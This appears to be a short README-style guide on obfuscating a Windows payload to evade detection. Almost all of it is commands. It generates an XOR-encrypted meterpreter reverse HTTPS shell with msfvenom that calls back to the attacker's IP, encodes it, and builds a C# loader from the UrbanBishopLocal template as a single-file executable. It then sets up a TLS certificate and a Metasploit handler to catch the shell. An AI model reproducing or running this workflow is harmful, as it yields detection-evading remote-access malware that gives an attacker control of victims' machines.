# Payload-Obfuscation
Some Usefull tools and specific modus operanti to obfuscate payload  

### Payload generation

```sh
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<OurIPADRESS> LPORT=443 --encrypt xor --encrypt-key <helloworld> --format raw > testf
```  
<helloworld> are the key but we can write what we want.  

### Hex data dump

```sh
hexdump -v -e '"\\""x" 1/1 "%02x" ""' <testf>
```  

### Convert data to Base64  
```sh
base64 <testf> > <newtest>
```

### Generate Key and certificate to obfuscate more seriously
```sh
openssl req -newkey rsa:4096 \
            -x509 \
            -sha256 \
            -days 3650 \
            -nodes \
            -out example.crt \
            -keyout example.key
```  
- Concatenate two files in one 

example.key & example.crt > example.pem

### UrbanBishopLocal (for compile c# progam)  
- https://github.com/slyd0g/UrbanBishopLocal  
on windows machine install git, netcore and vscode, in the vscode install the c# extension  
```sh
dotnet new console -o <nameofproject>
cd <nameofproject>
code . (allowing to open the progam.cs in vscode directly)
```   
--> in this part we will make a copy of the code in the UrbanBishopLocal folder which named program.cs --> it's template to make the obfuscation of our payload (just copy our base64 code at the end progam.cs), but also we specified the same key which we are defined in the msfvenom part.  
            ![image](https://user-images.githubusercontent.com/88449481/162997528-3483d787-4104-4ff4-b5b5-f0b256f523bb.png)  
            ![image](https://user-images.githubusercontent.com/88449481/162997827-685cb1b2-8350-4cc8-bdaf-79deadbf74a6.png)

#### don't forget the c# extension  

```sh
dotnet build
```  
But if you want the compilation in one file only you can run that:
```sh
dotnet publish -r win-x64 -c Release /p:PublishSingleFile=true
```  
### Metasploit

```sh
msfconsole  
use exploit/multi/handler  
set HandlerSSLCert </home/PATH/TO/THE/example.pem> (of the key we are generate earlier)  
set StagerVerifySSLCert true  
set LHOST <ourIPADRESS>  
set LPORT 443  
exploit
```  
